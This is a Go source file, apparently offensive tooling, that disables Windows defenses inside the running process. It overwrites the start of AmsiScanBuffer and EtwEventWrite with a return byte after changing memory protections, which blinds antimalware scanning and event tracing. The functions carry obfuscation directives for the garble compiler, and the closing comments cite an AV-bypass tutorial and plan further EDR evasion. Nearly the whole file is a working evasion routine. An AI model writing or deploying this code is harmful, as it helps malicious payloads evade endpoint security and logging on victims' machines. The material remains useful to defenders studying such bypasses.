package AMSI_EDR

import (
	"fmt"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
func PatchLocal(address uintptr, patch []byte) error {
	// Add write permissions
	var oldprotect uint32
	err := windows.VirtualProtect(address, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, &oldprotect)
	if err != nil {
		return fmt.Errorf("[-] Failed to change memory permissions for 0x%x: %v", address, err)
	}
	modntdll := syscall.NewLazyDLL("Ntdll.dll")
	procrtlMoveMemory := modntdll.NewProc("RtlMoveMemory")

	// Write Patch
	procrtlMoveMemory.Call(address, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)))
	fmt.Printf("[+] Wrote patch at destination address 0x%x\n", address)

	// Restore memory permissions
	err = windows.VirtualProtect(address, uintptr(len(patch)), oldprotect, &oldprotect)
	if err != nil {
		return fmt.Errorf("[-] Failed to change memory permissions for 0x%x: %v", address, err)
	}
	// Verify Patch
	verified := verifyPatch(address, patch)
	if !verified {
		return fmt.Errorf("[-] Verification failed for patch at address 0x%x", address)
	}

	return nil
}

//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
func verifyPatch(address uintptr, patch []byte) bool {
	for i := 0; i < len(patch); i++ {
		if *(*byte)(unsafe.Pointer(address + uintptr(i))) != patch[i] {
			fmt.Errorf("[-] Byte mismatch at address 0x%x: expected 0x%x, got 0x%x", address+uintptr(i), patch[i], *(*byte)(unsafe.Pointer(address + uintptr(i))))
			return false
		}
	}
	fmt.Printf("[+] Patch verified at address 0x%x", address)
	return true
}

//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
func patchAmsiLocal() error {
	fmt.Println("[*] Patching AmsiScanBuffer -- Local Process")
	amsidll, _ := syscall.LoadLibrary("amsi.dll")
	procAmsiScanBuffer, _ := syscall.GetProcAddress(amsidll, "AmsiScanBuffer")

	patch := []byte{0xc3}
	err := PatchLocal(procAmsiScanBuffer, patch)
	if err != nil {
		return err
	}
	fmt.Println("[+] Patched AmsiScanBuffer -- Local Process")
	return nil
}

//garble:controlflow flatten_passes=1 flatten_hardening=xor,delegate_table
func patchEtwLocal() error {
	fmt.Println("[*] Patching EtwEventWrite -- Local Process")
	ntdll, _ := syscall.LoadLibrary("ntdll.dll")
	procEtwEventWrite, _ := syscall.GetProcAddress(ntdll, "EtwEventWrite")
	patch := []byte{0xC3}
	err := PatchLocal(procEtwEventWrite, patch)
	if err != nil {
		return err
	}
	fmt.Println("[+] Patched EtwEventWrite -- Local Process")
	return nil
}

func ExecuteAllPatches() error {
	err := patchAmsiLocal()
	if err != nil {
		return err
	}
	err = patchEtwLocal()
	if err != nil {
		return err
	}
	return nil
}

//light modification from this code https://www.scriptchildie.com/evasion/av-bypass/5.-amsi-bypass
//TODO: Need to implement indirect syscalls to get rid of ntdll unhooking
